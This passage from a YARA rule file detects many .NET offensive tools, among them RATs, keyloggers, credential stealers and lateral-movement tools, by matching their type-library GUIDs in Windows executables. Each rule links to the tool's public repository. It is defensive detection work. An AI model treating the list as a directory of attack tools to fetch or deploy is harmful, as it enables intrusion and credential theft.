\"10085d98-48b9-42a8-b15b-cb27a243761b\" ascii nocase wide\n        $typelibguid3 = \"6aacd159-f4e7-4632-bad1-2ae8526a9633\" ascii nocase wide\n        $typelibguid4 = \"49a6719e-11a8-46e6-ad7a-1db1be9fea37\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_MemoryMapper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jasondrawdy/MemoryMapper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"b9fbf3ac-05d8-4cd5-9694-b224d4e6c0ea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_VanillaRAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/DannyTheSloth/VanillaRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"d0f2ee67-0a50-423d-bfe6-845da892a2db\" ascii nocase wide\n        $typelibguid1 = \"a593fcd2-c8ab-45f6-9aeb-8ab5e20ab402\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UnmanagedPowerShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/leechristensen/UnmanagedPowerShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"dfc4eebb-7384-4db5-9bad-257203029bd9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Quasar {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/quasar/Quasar\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"cfda6d2e-8ab3-4349-b89a-33e1f0dab32b\" ascii nocase wide\n        $typelibguid1 = \"c7c363ba-e5b6-4e18-9224-39bc8da73172\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpAdidnsdump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/b4rtik/SharpAdidnsdump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"cdb02bc2-5f62-4c8a-af69-acc3ab82e741\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DotNetToJScript {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/DotNetToJScript\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"7e3f231c-0d0b-4025-812c-0ef099404861\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Inferno {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/Inferno\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"26d498f7-37ae-476c-97b0-3761e3a919f0\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSearch {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/SharpSearch\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"98fee742-8410-4f20-8b2d-d7d789ab003d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSecDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/G0ldenGunSec/SharpSecDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e2fdd6cc-9886-456c-9021-ee2c47cf67b7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Net_GPPPassword {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/outflanknl/Net-GPPPassword\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"00fcf72c-d148-4dd0-9ca4-0181c4bd55c3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_FileSearcher {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NVISO-BE/FileSearcher\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2c879479-5027-4ce9-aaac-084db0e6d630\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ADFSDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fireeye/ADFSDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"9ee27d63-6ac9-4037-860b-44e91bae7f0d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpRDP {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xthirteen/SharpRDP\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"f1df1d0f-ff86-4106-97a8-f95aaf525c54\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCall {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jhalon/SharpCall\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"c1b0a923-0f17-4bc8-ba0f-c87aff43e799\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ysoserial_net {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/pwntester/ysoserial.net\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e1e8c029-f7cd-4bd1-952e-e819b41520f0\" ascii nocase wide\n        $typelibguid1 = \"6b40fde7-14ea-4f57-8b7b-cc2eb4a25e6c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ManagedInjection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/ManagedInjection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e5182bff-9562-40ff-b864-5a6b30c3b13b\" ascii nocase wide\n        $typelibguid1 = \"fdedde0d-e095-41c9-93fb-c2219ada55b1\" ascii nocase wide\n        $typelibguid2 = \"0dd00561-affc-4066-8c48-ce950788c3c8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSocks {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nettitude/SharpSocks\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2f43992e-5703-4420-ad0b-17cb7d89c956\" ascii nocase wide\n        $typelibguid1 = \"86d10a34-c374-4de4-8e12-490e5e65ddff\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Sharp_WMIExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/checkymander/Sharp-WMIExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0a63b0a1-7d1a-4b84-81c3-bbbfe9913029\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_KeeThief {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/KeeThief\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid1 = \"39aa6f93-a1c9-497f-bad2-cc42a61d5710\" ascii nocase wide\n        $typelibguid3 = \"3fca8012-3bad-41e4-91f4-534aa9a44f96\" ascii nocase wide\n        $typelibguid4 = \"ea92f1e6-3f34-48f8-8b0a-f2bbc19220ef\" ascii nocase wide\n        $typelibguid5 = \"c23b51c4-2475-4fc6-9b3a-27d0a2b99b0f\" ascii nocase wide\n        $typelibguid6 = \"94432a8e-3e06-4776-b9b2-3684a62bb96a\" ascii nocase wide\n        $typelibguid7 = \"80ba63a4-7d41-40e9-a722-6dd58b28bf7e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_fakelogonscreen {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/bitsadmin/fakelogonscreen\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"d35a55bd-3189-498b-b72f-dc798172e505\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PoshSecFramework {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/PoshSec/PoshSecFramework\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"b1ac6aa0-2f1a-4696-bf4b-0e41cf2f4b6b\" ascii nocase wide\n        $typelibguid1 = \"78bfcfc2-ef1c-4514-bce6-934b251666d2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpAttack {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jaredhaight/SharpAttack\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"5f0ceca3-5997-406c-adf5-6c7fbb6cba17\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Altman {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/keepwn/Altman\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"64cdcd2b-7356-4079-af78-e22210e66154\" ascii nocase wide\n        $typelibguid1 = \"f1dee29d-ca98-46ea-9d13-93ae1fda96e1\" ascii nocase wide\n        $typelibguid2 = \"33568320-56e8-4abb-83f8-548e8d6adac2\" ascii nocase wide\n        $typelibguid3 = \"470ec930-70a3-4d71-b4ff-860fcb900e85\" ascii nocase wide\n        $typelibguid4 = \"9514574d-6819-44f2-affa-6158ac1143b3\" ascii nocase wide\n        $typelibguid5 = \"0f3a9c4f-0b11-4373-a0a6-3a6de814e891\" ascii nocase wide\n        $typelibguid6 = \"9624b72e-9702-4d78-995b-164254328151\" ascii nocase wide\n        $typelibguid7 = \"faae59a8-55fc-48b1-a9b5-b1759c9c1010\" ascii nocase wide\n        $typelibguid8 = \"37af4988-f6f2-4f0c-aa2b-5b24f7ed3bf3\" ascii nocase wide\n        $typelibguid9 = \"c82aa2fe-3332-441f-965e-6b653e088abf\" ascii nocase wide\n        $typelibguid10 = \"6e531f6c-2c89-447f-8464-aaa96dbcdfff\" ascii nocase wide\n        $typelibguid11 = \"231987a1-ea32-4087-8963-2322338f16f6\" ascii nocase wide\n        $typelibguid12 = \"7da0d93a-a0ae-41a5-9389-42eff85bb064\" ascii nocase wide\n        $typelibguid13 = \"a729f9cc-edc2-4785-9a7d-7b81bb12484c\" ascii nocase wide\n        $typelibguid14 = \"55a1fd43-d23e-4d72-aadb-bbd1340a6913\" ascii nocase wide\n        $typelibguid15 = \"d43f240d-e7f5-43c5-9b51-d156dc7ea221\" ascii nocase wide\n        $typelibguid16 = \"c2e6c1a0-93b1-4bbc-98e6-8e2b3145db8e\" ascii nocase wide\n        $typelibguid17 = \"714ae6f3-0d03-4023-b753-fed6a31d95c7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BrowserPass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jabiel/BrowserPass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"3cb59871-0dce-453b-857a-2d1e515b0b66\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Mythic {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/its-a-feature/Mythic\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"91f7a9da-f045-4239-a1e9-487ffdd65986\" ascii nocase wide\n        $typelibguid1 = \"0405205c-c2a0-4f9a-a221-48b5c70df3b6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Nuages {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/p3nt4/Nuages\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"e9e80ac7-4c13-45bd-9bde-ca89aadf1294\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSniper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/HunnicCyber/SharpSniper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"c8bb840c-04ce-4b60-a734-faf15abf7b18\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpHound3 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BloodHoundAD/SharpHound3\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"a517a8de-5834-411d-abda-2d0e1766539c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BlockEtw {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Soledge/BlockEtw\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"daedf7b3-8262-4892-adc4-425dd5f85bca\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpWifiGrabber {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/r3nhat/SharpWifiGrabber\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"c0997698-2b73-4982-b25b-d0578d1323c2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpMapExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cube0x0/SharpMapExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"bd5220f7-e1fb-41d2-91ec-e4c50c6e9b9f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_k8fly {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/zzwlpx/k8fly\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"13b6c843-f3d4-4585-b4f3-e2672a47931e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Stealer {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malwares/Stealer\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"8fcd4931-91a2-4e18-849b-70de34ab75df\" ascii nocase wide\n        $typelibguid1 = \"e48811ca-8af8-4e73-85dd-2045b9cca73a\" ascii nocase wide\n        $typelibguid2 = \"d3d8a1cc-e123-4905-b3de-374749122fcf\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PortTran {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/k8gege/PortTran\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"3a074374-77e8-4312-8746-37f3cb00e82c\" ascii nocase wide\n        $typelibguid1 = \"67a73bac-f59d-4227-9220-e20a2ef42782\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\n\nrule HKTL_NET_GUID_gray_keylogger_2 {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/graysuit/gray-keylogger-2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"e94ca3ff-c0e5-4d1a-ad5e-f6ebbe365067\" ascii nocase wide\n        $typelibguid1 = \"1ed07564-b411-4626-88e5-e1cd8ecd860a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Lime_Miner {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-Miner\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"13958fb9-dfc1-4e2c-8a8d-a5e68abdbc66\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BlackNET {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BlackHacker511/BlackNET\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"c2b90883-abee-4cfa-af66-dfd93ec617a5\" ascii nocase wide\n        $typelibguid1 = \"8bb6f5b4-e7c7-4554-afd1-48f368774837\" ascii nocase wide\n        $typelibguid2 = \"983ae28c-91c3-4072-8cdf-698b2ff7a967\" ascii nocase wide\n        $typelibguid3 = \"9ac18cdc-3711-4719-9cfb-5b5f2d51fd5a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PlasmaRAT {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mwsrc/PlasmaRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"b8a2147c-074c-46e1-bb99-c8431a6546ce\" ascii nocase wide\n        $typelibguid1 = \"0fcfde33-213f-4fb6-ac15-efb20393d4f3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Lime_RAT {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-RAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"e58ac447-ab07-402a-9c96-95e284a76a8d\" ascii nocase wide\n        $typelibguid1 = \"8fb35dab-73cd-4163-8868-c4dbcbdf0c17\" ascii nocase wide\n        $typelibguid2 = \"37845f5b-35fe-4dce-bbec-2d07c7904fb0\" ascii nocase wide\n        $typelibguid3 = \"83c453cf-0d29-4690-b9dc-567f20e63894\" ascii nocase wide\n        $typelibguid4 = \"8b1f0a69-a930-42e3-9c13-7de0d04a4add\" ascii nocase wide\n        $typelibguid5 = \"eaaeccf6-75d2-4616-b045-36eea09c8b28\" ascii nocase wide\n        $typelibguid6 = \"5b2ec674-0aa4-4209-94df-b6c995ad59c4\" ascii nocase wide\n        $typelibguid7 = \"e2cc7158-aee6-4463-95bf-fb5295e9e37a\" ascii nocase wide\n        $typelibguid8 = \"d04ecf62-6da9-4308-804a-e789baa5cc38\" ascii nocase wide\n        $typelibguid9 = \"8026261f-ac68-4ccf-97b2-3b55b7d6684d\" ascii nocase wide\n        $typelibguid10 = \"212cdfac-51f1-4045-a5c0-6e638f89fce0\" ascii nocase wide\n        $typelibguid11 = \"c1b608bb-7aed-488d-aa3b-0c96625d26c0\" ascii nocase wide\n        $typelibguid12 = \"4c84e7ec-f197-4321-8862-d5d18783e2fe\" ascii nocase wide\n        $typelibguid13 = \"3fc17adb-67d4-4a8d-8770-ecfd815f73ee\" ascii nocase wide\n        $typelibguid14 = \"f1ab854b-6282-4bdf-8b8b-f2911a008948\" ascii nocase wide\n        $typelibguid15 = \"aef6547e-3822-4f96-9708-bcf008129b2b\" ascii nocase wide\n        $typelibguid16 = \"a336f517-bca9-465f-8ff8-2756cfd0cad9\" ascii nocase wide\n        $typelibguid17 = \"5de018bd-941d-4a5d-bed5-fbdd111aba76\" ascii nocase wide\n        $typelibguid18 = \"bbfac1f9-cd4f-4c44-af94-1130168494d0\" ascii nocase wide\n        $typelibguid19 = \"1c79cea1-ebf3-494c-90a8-51691df41b86\" ascii nocase wide\n        $typelibguid20 = \"927104e1-aa17-4167-817c-7673fe26d46e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_njRAT {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mwsrc/njRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"5a542c1b-2d36-4c31-b039-26a88d3967da\" ascii nocase wide\n        $typelibguid1 = \"6b07082a-9256-42c3-999a-665e9de49f33\" ascii nocase wide\n        $typelibguid2 = \"c0a9a70f-63e8-42ca-965d-73a1bc903e62\" ascii nocase wide\n        $typelibguid3 = \"70bd11de-7da1-4a89-b459-8daacc930c20\" ascii nocase wide\n        $typelibguid4 = \"fc790ee5-163a-40f9-a1e2-9863c290ff8b\" ascii nocase wide\n        $typelibguid5 = \"cb3c28b2-2a4f-4114-941c-ce929fec94d3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Manager {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/Manager\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"dda73ee9-0f41-4c09-9cad-8215abd60b33\" ascii nocase wide\n        $typelibguid1 = \"6a0f2422-d4d1-4b7e-84ad-56dc0fd2dfc5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_neo_ConfuserEx {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/XenocodeRCE/neo-ConfuserEx\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"e98490bb-63e5-492d-b14e-304de928f81a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpAllowedToAct {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/pkb1s/SharpAllowedToAct\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"dac5448a-4ad1-490a-846a-18e4e3e0cf9a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SuperSQLInjectionV1 {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shack2/SuperSQLInjectionV1\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"d5688068-fc89-467d-913f-037a785caca7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ADSearch {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tomcarver16/ADSearch\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"4da5f1b7-8936-4413-91f7-57d6e072b4a7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_privilege_escalation_awesome_scripts_suite {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"1928358e-a64b-493f-a741-ae8e3d029374\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CVE_2020_1206_POC {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ZecOps/CVE-2020-1206-POC\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"3523ca04-a12d-4b40-8837-1a1d28ef96de\" ascii nocase wide\n        $typelibguid1 = \"d3a2f24a-ddc6-4548-9b3d-470e70dbcaab\" ascii nocase wide\n        $typelibguid2 = \"fb30ee05-4a35-45f7-9a0a-829aec7e47d9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DInvoke {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/DInvoke\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"b77fdab5-207c-4cdb-b1aa-348505c54229\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpChisel {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shantanu561993/SharpChisel\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"f5f21e2d-eb7e-4146-a7e1-371fd08d6762\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpScribbles {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/V1V1/SharpScribbles\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = 